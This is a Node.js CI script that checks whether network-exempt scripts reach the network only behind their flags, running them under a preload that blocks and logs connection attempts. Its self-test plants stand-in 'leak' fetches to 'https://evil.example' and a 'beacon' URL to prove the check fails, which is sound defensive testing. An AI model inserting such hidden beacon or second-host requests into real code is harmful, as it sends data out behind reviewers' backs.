#!/usr/bin/env node
// The premise of the network exemptions, checked by running them (review 7, C3).
//
//   node scripts/network-exempt-check.mjs --self-test
//   node scripts/network-exempt-check.mjs
//
// `row-confidence.mjs` exempts three scripts of the gate's rows from the network half of its scan (`scripts/network-exempt.mjs`): `drift-check.mjs` and `venue-coverage-check.mjs` because they fetch only
// behind a flag the rows do not pass, and `mutation-await.mjs` as the one sanctioned read. Those are claims about what the scripts DO, and the scorer only reads: it never compared the table with a run.
// Measured 2026-11-05, in scratch copies of the tree: an unconditional `await fetch(...)` added to `drift-check.mjs`, then to `venue-coverage-check.mjs`, and a second fetch to another host added to
// `mutation-await.mjs`, each left `row-confidence.mjs` at 23/23 rows at or above 95 and `--self-test` green. The premise had been checked once by hand, with stand-ins, and written in a comment.
//
// So this runs it. Under `no-network-preload.mjs` (every node process it starts has the network closed, ends at its first attempt with code 97, and writes the attempt down) it requires, for each entry:
//   a flag entry   (1) the script's source reads the table's flag as a quoted literal, so a typo or a renamed flag in the table is a failure and not a silent end to the lapse the scorer relies on;
//                  (2) POSITIVE CONTROL: with the flag (the entry's `control`) the script reaches for the network and is stopped (exit 97, an attempt written down). A preload that closed nothing
//                      would make (3) pass, and this is what shows it can fail;
//                  (3) the row's own commands, run as the gate runs them (`scripts/run-row.mjs <row>`), pass and make no attempt. The mark, not the exit status, decides: `decoders still REJECT the
//                      corrupted fixture` passes when its script FAILS, so a script ended by the preload would pass it.
//   the sanction   the script's attempts, run with the network refused and recorded, are all under the one address the entry names (`within`), and there is at least one.
// And first: the build outputs the exempt scripts import are there. They are not optional: without them every control fails to start, and a missing build must read as a failure of this check, never as
// "no attempt was made".
//
// Rule 91, what this covers: it runs the commands the rows run and one control per entry. It does not see a request the row's commands do not reach (the row does not make it either), and not one the
// preload does not close (a child process such as `curl`, `dns`, `dgram`); the scorer's own scan lists the same limits. The sanctioned wait is run once with a single attempt: its first request, the
// artifact list of its run, is what is checked against `within`; its job list and its artifact download (a different path) are not reached.
import { spawnSync } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { createChecks, finish, isMain } from './checks.mjs'
import { NETWORK_EXEMPT } from './network-exempt.mjs'

// The preload, from the repository root this file is in, spelled as the path a workflow would use (`scripts/check-script-orphans.mjs` follows that spelling and not a `new URL` of a sibling).
const PRELOAD = pathToFileURL(join(fileURLToPath(new URL('..', import.meta.url)), 'scripts/no-network-preload.mjs')).href

/** Run `node <args>` with the network closed. `mode` is `exit` (the first attempt ends the process with code 97) or `record` (attempts are written down and refused, and the run goes on). */
export const underPreload = (args, { cwd = '.', env = {}, mode = 'exit' } = {}) => {
  const dir = mkdtempSync(join(tmpdir(), 'network-exempt-'))
  const mark = join(dir, 'attempts')
  try {
    const r = spawnSync(process.execPath, args, {
      cwd, encoding: 'utf8', timeout: 120000,
      env: { ...process.env, ...env, NODE_OPTIONS: `${process.env.NODE_OPTIONS ?? ''} --import ${PRELOAD}`.trim(), NO_NETWORK_MARK: mark, NO_NETWORK_MODE: mode },
    })
    return { code: r.status, signal: r.signal, attempts: existsSync(mark) ? readFileSync(mark, 'utf8').split('\n').filter(Boolean) : [], out: `${r.stdout ?? ''}${r.stderr ?? ''}`.trim() }
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

/** Does `src` read `flag` as a quoted literal (`argOf('--url')`, `args.includes("--report")`)? */
export const flagLiteral = (src, flag) => new RegExp(`(['"\`])${flag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\1`).test(src)

const tail = r => r.out.split('\n').slice(-2).join(' | ').slice(0, 220)

/** The build outputs (`../build/X.js`) the entries' scripts import that are not there under `root`. */
export const missingBuild = (table, root) => {
  const wanted = new Set()
  for (const e of table) {
    let src = ''
    try { src = readFileSync(join(root, e.script), 'utf8') } catch { continue }
    for (const m of src.matchAll(/(?:from|import)\s*['"]\.\.\/(build\/[\w./-]+)['"]/g)) wanted.add(m[1])
  }
  return [...wanted].filter(f => !existsSync(join(root, f))).sort()
}

/** What is wrong with one entry's script, by part: `table` (its flag as a literal, and a control that passes it), `controls` (what the control does) and `sanction`. Empty parts when nothing. */
export const auditScript = (entry, root) => {
  const where = entry.script
  const control = entry.control
  const parts = { table: [], controls: [], sanction: [] }
  if (!control || !Array.isArray(control.args)) { parts.table.push(`${where}: the entry has no control (a command that makes the script reach the network)`); return parts }
  if (entry.sanctioned) {
    if (typeof control.within !== 'string' || control.within === '') { parts.table.push(`${where}: the sanction names no address its attempts have to be under (within)`); return parts }
    const r = underPreload([where, ...control.args], { cwd: root, env: control.env, mode: 'record' })
    const stray = r.attempts.filter(a => !a.slice(a.indexOf(' ') + 1).startsWith(control.within))
    if (r.attempts.length === 0) parts.sanction.push(`${where}: the sanctioned wait made no attempt on the network under its control (exit ${r.code}: ${tail(r)}), so it is not the read the table says it is`)
    if (stray.length > 0) parts.sanction.push(`${where}: the sanctioned wait asked for ${stray.length} address(es) outside ${control.within}: ${stray.slice(0, 2).join(' ; ')}`)
    return parts
  }
  if (!flagLiteral(readFileSync(join(root, where), 'utf8'), entry.flag)) parts.table.push(`${where}: its source does not read ${entry.flag} as a quoted literal, so the table's flag is not one the script has`)
  if (!control.args.includes(entry.flag)) parts.table.push(`${where}: the control does not pass ${entry.flag}`)
  const r = underPreload([where, ...control.args], { cwd: root, env: control.env, mode: 'exit' })
  if (!(r.code === 97 && r.attempts.length > 0)) parts.controls.push(`${where} ${control.args.join(' ')}: the control was not stopped on an attempt (exit ${r.code}, ${r.attempts.length} attempt(s)): ${tail(r)}`)
  return parts
}

/** What is wrong with one row: its commands, run as the gate runs them, must pass and must not reach for the network. */
export const auditRow = (rowName, root) => {
  const r = underPreload(['scripts/run-row.mjs', rowName], { cwd: root, mode: 'exit' })
  return [
    ...(r.attempts.length > 0 ? [`"${rowName}": its commands reached for the network: ${r.attempts.slice(0, 2).join(' ; ')}`] : []),
    ...(r.code !== 0 && r.attempts.length === 0 ? [`"${rowName}": did not pass under the preload (exit ${r.code}): ${tail(r)}`] : []),
  ]
}

/** Everything wrong with `table` under `root`, by part, and how many runs it took. A missing build ends it at once, as a failure. */
export const audit = (table, root = '.') => {
  const out = { build: [], table: [], controls: [], rows: [], sanction: [], ran: 0 }
  const missing = missingBuild(table, root)
  if (missing.length > 0) {
    out.build = missing.map(f => `${f} is missing (run npm run build): the exempt scripts import it, so no control or row can run without it`)
    return out
  }
  const flagged = table.filter(e => !e.sanctioned)
  const seen = new Set()
  for (const e of flagged) {
    const key = `${e.script} ${e.flag} ${JSON.stringify(e.control)}`
    if (seen.has(key)) continue
    seen.add(key)
    const p = auditScript(e, root)
    out.table.push(...p.table); out.controls.push(...p.controls)
    out.ran++
  }
  for (const row of [...new Set(flagged.map(e => e.row))]) { out.rows.push(...auditRow(row, root)); out.ran++ }
  for (const e of table.filter(x => x.sanctioned)) {
    const p = auditScript(e, root)
    out.table.push(...p.table); out.sanction.push(...p.sanction)
    out.ran++
  }
  return out
}

const real = () => {
  const { check, summarize } = createChecks()
  const flagged = NETWORK_EXEMPT.filter(e => !e.sanctioned)
  const sanctioned = NETWORK_EXEMPT.filter(e => e.sanctioned)
  const rowNames = [...new Set(flagged.map(e => e.row))]
  const found = audit(NETWORK_EXEMPT, '.')
  check(`the build outputs the exempt scripts import are there (a missing one is a failure, never a skip)`, found.build.length === 0, found.build.join(' / '))
  check(`each table flag is read by its script as a quoted literal and passed by its control, and the sanction names its address: ${flagged.length} flag entries, ${[...new Set(flagged.map(e => `${e.script} ${e.flag}`))].length} distinct (${[...new Set(flagged.map(e => `${e.script} ${e.flag}`))].join(', ')}), ${sanctioned.length} sanctioned`,
    found.table.length === 0 && found.ran > 0, found.table.join(' / ') || 'nothing was run')
  check(`with its flag, each exempt script reaches for the network and the preload stops it (exit 97, an attempt written down): ${[...new Set(flagged.map(e => `${e.script} ${e.control?.args?.join(' ')}`))].length} controls`,
    found.controls.length === 0 && found.ran > 0, found.controls.join(' / ') || 'nothing was run')
  check(`without the flag, each exempt row passes and makes no attempt on the network: ${rowNames.length} rows (${rowNames.join(', ')}), run as the gate runs them`,
    found.rows.length === 0 && found.ran > 0, found.rows.join(' / ') || 'nothing was run')
  check(`the sanctioned wait asks for the GitHub API path of its run and nowhere else: ${sanctioned.length} sanctioned entr${sanctioned.length === 1 ? 'y' : 'ies'} (${sanctioned.map(e => e.script).join(', ')}), run with the network refused and recorded`,
    found.sanction.length === 0 && found.ran > 0, found.sanction.join(' / ') || 'nothing was run')
  finish(summarize())
}

// --- self-test ----------------------------------------------------------------------------------------------------------------------------------
//
// Stand-ins in a directory of their own, laid out like the repository: a `scripts/` with a stand-in `run-row.mjs` (the gate's `ok` and `fails` over a table of commands), the exempt scripts, and a
// `build/`. The scenarios are the ones review 7 measured on the real scripts (an unconditional fetch, an unguarded one, a flag typo, a second host) plus the ones that make this check able to fail:
// a preload that closes nothing, a row that passes because its script was ended, and a build that is not there.
const GATED = (before = '') => "import { argv } from 'node:process'\nimport '../build/Fake.js'\n" + before + "if (argv.includes('--go')) await fetch(argv[argv.indexOf('--go') + 1] ?? 'http://control.invalid/x')\nif (argv.includes('--bad')) process.exit(1)\n"
const RUN_ROW = "import { readFileSync } from 'node:fs'\nimport { spawnSync } from 'node:child_process'\n" +
  "const spec = JSON.parse(readFileSync('rows.json', 'utf8'))[process.argv[2]]\n" +
  "const statuses = spec.commands.map(c => spawnSync(process.execPath, c, { stdio: 'ignore' }).status)\n" +
  "process.exit((spec.expect === 'fail' ? statuses.every(s => s !== 0) : statuses.every(s => s === 0)) ? 0 : 1)\n"

if (isMain(import.meta.url) && process.argv.includes('--self-test')) {
  const { check, summarize } = createChecks()
  const work = mkdtempSync(join(tmpdir(), 'network-exempt-self-'))
  try {
    // --- the preload, client by client. One run in `record` mode attempts all of them and lists each; one in `exit` mode is ended by the first.
    const CLIENTS = [['fetch', "fetch(U)"], ['fetch', "fetch(new URL(U))"], ['fetch', "fetch(new Request(U))"], ['WebSocket', "new WebSocket('ws://control.invalid/x')"], ['http.get', 'http.get(U)'], ['http.request', 'http.request(U)'], ['http.get', 'get(U)'],
      ['https.get', "https.get('https://control.invalid/x')"], ['https.request', "https.request('https://control.invalid/x')"], ['http2.connect', "http2.connect('https://control.invalid/x')"],
      ['net.connect', "net.connect(80, 'control.invalid')"], ['net.createConnection', "net.createConnection(80, 'control.invalid')"], ['tls.connect', "tls.connect(443, 'control.invalid')"]]
    const clientsFile = join(work, 'clients.mjs')
    writeFileSync(clientsFile, "import * as http from 'node:http'\nimport { get } from 'node:http'\nimport https from 'node:https'\nimport http2 from 'node:http2'\nimport net from 'node:net'\nimport tls from 'node:tls'\n" +
      "const U = 'http://control.invalid/x'\nconst tries = [" + CLIENTS.map(([, call]) => `() => ${call}`).join(', ') + "]\n" +
      "for (const t of tries) { try { const r = t(); if (r && r.catch) await r.catch(e => console.log('rejected')) } catch { console.log('threw') } }\nprocess.exit(0)\n")
    const rec = underPreload([clientsFile], { mode: 'record' })
    const want = CLIENTS.map(([name]) => name)
    const gotNames = rec.attempts.map(a => a.split(' ')[0])
    const missingClients = want.filter((n, i) => gotNames[i] !== n)
    const fetchTargets = rec.attempts.filter(a => a.startsWith('fetch ')), refusals = rec.out.split('\n')
    check(`THE PRELOAD CLOSES EVERY CLIENT: ${CLIENTS.length} calls (fetch given a string, a URL and a Request; WebSocket; http.get|request; a named import of get; https.get|request; http2.connect; net.connect|createConnection; tls.connect), each written down in order with its target, and a run in record mode goes on to the end (exit ${rec.code}): fetch REJECTS (3) and every other client THROWS (${CLIENTS.length - 3})`,
      rec.code === 0 && gotNames.length === want.length && missingClients.length === 0 && fetchTargets.length === 3 && fetchTargets.every(a => a === 'fetch http://control.invalid/x') && rec.attempts[10].startsWith('net.connect control.invalid:80')
        && refusals.filter(l => l === 'rejected').length === 3 && refusals.filter(l => l === 'threw').length === CLIENTS.length - 3,
      `wanted ${want.join(', ')}; saw ${gotNames.join(', ') || '(none)'} (exit ${rec.code}); fetch targets ${fetchTargets.join(' ; ')}; rejected ${refusals.filter(l => l === 'rejected').length}, threw ${refusals.filter(l => l === 'threw').length}: ${tail(rec)}`)
    const quiet = join(work, 'quiet.mjs'); writeFileSync(quiet, "console.log('quiet')\n")
    const firstAttempt = join(work, 'first.mjs'); writeFileSync(firstAttempt, "console.log('before')\nawait fetch('http://control.invalid/x')\nconsole.log('after')\n")
    const q = underPreload([quiet]), f = underPreload([firstAttempt])
    check('A RUN WITH NO ATTEMPT EXITS 0 AND LEAVES NO MARK; THE FIRST ATTEMPT ENDS THE PROCESS WITH CODE 97 AND THE LINES AFTER IT NEVER RUN',
      q.code === 0 && q.attempts.length === 0 && f.code === 97 && f.attempts.length === 1 && f.out.includes('before') && !f.out.includes('after'),
      `quiet: exit ${q.code}, ${q.attempts.length} attempt(s); first attempt: exit ${f.code}, ${f.attempts.length} attempt(s), output ${JSON.stringify(f.out)}`)

    // --- the audit, on stand-ins laid out like the repository.
    const lay = (name, { gated = GATED(), rows, build = true }) => {
      const root = join(work, name)
      mkdirSync(join(root, 'scripts'), { recursive: true })
      if (build) { mkdirSync(join(root, 'build'), { recursive: true }); writeFileSync(join(root, 'build', 'Fake.js'), 'export {}\n') }
      writeFileSync(join(root, 'scripts', 'run-row.mjs'), RUN_ROW)
      writeFileSync(join(root, 'scripts', 'gated.mjs'), gated)
      writeFileSync(join(root, 'rows.json'), JSON.stringify(rows))
      return root
    }
    const ROWS = { accepts: { expect: 'pass', commands: [['scripts/gated.mjs']] }, rejects: { expect: 'fail', commands: [['scripts/gated.mjs', '--bad']] } }
    const entry = { row: 'accepts', script: 'scripts/gated.mjs', flag: '--go', control: { args: ['--go'] } }
    const TABLE = [entry, { ...entry, row: 'rejects' }]
    const problemsOf = a => [...a.build, ...a.table, ...a.controls, ...a.rows, ...a.sanction]
    const good = audit(TABLE, lay('good', { rows: ROWS }))
    check('A GATED SCRIPT THAT FETCHES ONLY WITH ITS FLAG PASSES THE AUDIT: the flag is a literal, the control is stopped, and both rows pass with no attempt (3 runs: one control, two rows)',
      problemsOf(good).length === 0 && good.ran === 3, `problems: ${problemsOf(good).join(' / ') || '(none)'}; ran ${good.ran} (wanted 3: one control, two rows)`)

    const SCENARIOS = [
      ['AN UNCONDITIONAL FETCH IN THE SCRIPT (review 7 (a), (b)) FAILS THE ROW', lay('unconditional', { gated: GATED("await fetch('http://control.invalid/beacon')\n"), rows: ROWS }), TABLE, a => a.rows.length >= 1 && /reached for the network/.test(a.rows.join())],
      ['A FETCH BEHIND A GUARD THAT WAS TURNED INTO `if (true)` (the edit that keeps the count at one) FAILS THE ROW', lay('unguarded', { gated: GATED().replace("argv.includes('--go')", 'true'), rows: ROWS }), TABLE, a => /reached for the network/.test(a.rows.join())],
      ['A SCRIPT THAT PASSES ITS ROW BECAUSE THE PRELOAD ENDED IT (a `fails` row) STILL FAILS: the mark decides, not the exit status', lay('ended', { gated: GATED("await fetch('http://control.invalid/beacon')\n"), rows: { ...ROWS, accepts: ROWS.rejects } }), [{ ...entry, row: 'accepts' }], a => /reached for the network/.test(a.rows.join())],
      ['A FLAG THAT IS NOT THE SCRIPT\'S (a typo in the table, or a renamed flag) FAILS TWICE: not a literal in the source, and its control is not stopped', lay('typo', { rows: ROWS }), TABLE.map(e => ({ ...e, flag: '--gx', control: { args: ['--gx'] } })), a => a.table.length >= 1 && a.controls.length >= 1],
      ['A CONTROL THAT DOES NOT PASS THE FLAG FAILS', lay('noflag', { rows: ROWS }), TABLE.map(e => ({ ...e, control: { args: [] } })), a => /does not pass --go/.test(a.table.join())],
      ['A FLAG THE SCRIPT READS BUT THAT NO LONGER REACHES THE NETWORK (the control is not stopped) FAILS', lay('inert', { gated: GATED().replace('await fetch(', 'await Promise.resolve('), rows: ROWS }), TABLE, a => /not stopped on an attempt/.test(a.controls.join())],
      ['A ROW THAT DOES NOT PASS UNDER THE PRELOAD FAILS, AND SAYS SO', lay('failing', { rows: { ...ROWS, accepts: { expect: 'pass', commands: [['scripts/gated.mjs', '--bad']] } } }), TABLE, a => /did not pass under the preload/.test(a.rows.join())],
    ]
    const offScenarios = SCENARIOS.map(([what, root, table, judge]) => ({ what, a: audit(table, root) })).filter((x, i) => !SCENARIOS[i][3](x.a))
    check(`THE AUDIT FAILS EACH WAY THE EXEMPTIONS CAN GO WRONG, for ${SCENARIOS.length} stand-in trees (an unconditional fetch, an unguarded one, a row passed by a dead script, a table flag the script does not have, a control without the flag, a flag that reaches nothing, a row that does not pass)`,
      offScenarios.length === 0, offScenarios.map(x => `${x.what}: ${problemsOf(x.a).join(' / ') || 'NO PROBLEM REPORTED'}`).join(' // ').slice(0, 700))

    // --- the sanction.
    const AWAIT = (extra = '', url = 'process.env.GITHUB_API_URL + "/repos/" + process.env.GITHUB_REPOSITORY + "/actions/runs/" + process.env.GITHUB_RUN_ID + "/artifacts"') => `${extra}try { await fetch(${url}) } catch {}\n`
    const SANCTIONED = { row: 'accepts', script: 'scripts/gated.mjs', sanctioned: 'a wait', control: { args: [], env: { GITHUB_API_URL: 'https://api.example', GITHUB_REPOSITORY: 'o/r', GITHUB_RUN_ID: '1' }, within: 'https://api.example/repos/o/r/actions/runs/1/' } }
    const sane = (name, body, entry2 = SANCTIONED) => audit([entry2], lay(name, { gated: body, rows: ROWS }))
    const ok1 = sane('s-ok', AWAIT()), none = sane('s-none', "console.log('no request')\n"), leak = sane('s-leak', AWAIT() + AWAIT('', '"https://evil.example/?t=1"')), noWithin = sane('s-nowithin', AWAIT(), { ...SANCTIONED, control: { ...SANCTIONED.control, within: undefined } }), noControl = sane('s-nocontrol', AWAIT(), { ...SANCTIONED, control: undefined })
    check('THE SANCTIONED WAIT MUST ASK FOR ITS OWN ADDRESS AND ONLY THAT: one request under `within` passes; no request, a second request to another host (review 7 (c)), no `within`, and no control each fail',
      ok1.sanction.length === 0 && ok1.ran === 1 && /made no attempt/.test(none.sanction.join()) && /outside https:\/\/api\.example/.test(leak.sanction.join()) && /names no address/.test(noWithin.table.join()) && /has no control/.test(noControl.table.join()),
      `ok: ${problemsOf(ok1).join(' / ') || '(none)'}; none: ${problemsOf(none).join(' / ') || '(none)'}; leak: ${problemsOf(leak).join(' / ') || '(none)'}; within: ${problemsOf(noWithin).join(' / ') || '(none)'}; control: ${problemsOf(noControl).join(' / ') || '(none)'}`)

    // --- a missing build is a failure, named, and nothing is run on it.
    const noBuild = audit(TABLE, lay('nobuild', { rows: ROWS, build: false }))
    check('A MISSING build/ IS A FAILURE THAT NAMES THE FILE, NOT A SKIP: the audit stops there (ran 0) and reports the import the exempt script needs',
      noBuild.build.length === 1 && /build\/Fake\.js is missing/.test(noBuild.build[0]) && noBuild.ran === 0 && missingBuild(TABLE, lay('hasbuild', { rows: ROWS })).length === 0,
      `build: ${noBuild.build.join(' / ') || '(none)'}; ran ${noBuild.ran}`)

    // --- the literal check.
    const LITERALS = [["argOf('--url')", '--url', true], ['args.includes("--report")', '--report', true], ['`--url`', '--url', true], ['// --url x', '--url', false], ["'--urls'", '--url', false], ["'--url=x'", '--url', false], ["'--uri'", '--url', false]]
    const badLit = LITERALS.filter(([src, flag, want]) => flagLiteral(src, flag) !== want)
    check(`THE FLAG LITERAL IS A WHOLE QUOTED FLAG, for ${LITERALS.length} sources (single, double and backtick quotes pass; a comment, a longer flag, a flag with a value and a near miss do not)`,
      badLit.length === 0, badLit.map(([src, flag, want]) => `${JSON.stringify(src)} ${flag}: wanted ${want}`).join(' / '))

    // --- the real table: every flag entry's control carries its flag, exactly one entry is sanctioned and it names `within`.
    const shape = NETWORK_EXEMPT.filter(e => !e.sanctioned).filter(e => !Array.isArray(e.control?.args) || !e.control.args.includes(e.flag))
    const sanctions = NETWORK_EXEMPT.filter(e => e.sanctioned)
    check(`THE REAL TABLE IS WHAT THE AUDIT NEEDS: each of its ${NETWORK_EXEMPT.length - sanctions.length} flag entries has a control that passes its flag, and its ${sanctions.length} sanctioned entry has a control and an address`,
      shape.length === 0 && sanctions.length === 1 && Array.isArray(sanctions[0].control?.args) && typeof sanctions[0].control?.within === 'string' && sanctions[0].control.within.startsWith(sanctions[0].control.env?.GITHUB_API_URL ?? '\0'),
      `flag entries without their flag in the control: ${shape.map(e => e.script).join(', ') || '(none)'}; sanctioned: ${sanctions.length}`)

    // --- the wiring: a check nothing runs proves nothing. package.json runs the self-test and then the real audit, and verify.yml runs that script on a step gated on the build (the audit needs it).
    const script = JSON.parse(readFileSync('package.json', 'utf8')).scripts?.['check:network-exempt'] ?? ''
    const step = readFileSync('.github/workflows/verify.yml', 'utf8').split(/\n(?= {6}- )/).find(st => /^\s+run:[ \t]*npm run check:network-exempt[ \t]*$/m.test(st))
    check('THE CHECK IS WIRED: package.json runs its self-test and then the audit, and a step of verify.yml runs npm run check:network-exempt gated on the build (1 package.json, 1 workflow)',
      script === 'node scripts/network-exempt-check.mjs --self-test && node scripts/network-exempt-check.mjs' && step !== undefined && /^\s+if:.*steps\.build\.outcome == 'success'/m.test(step),
      `package.json check:network-exempt = ${JSON.stringify(script)}; workflow step ${step === undefined ? 'not found' : 'found'}${step !== undefined && !/steps\.build\.outcome == 'success'/.test(step) ? ' but not gated on the build' : ''}`)
  } finally {
    rmSync(work, { recursive: true, force: true })
  }
  finish(summarize())
} else if (isMain(import.meta.url)) {
  real()
}
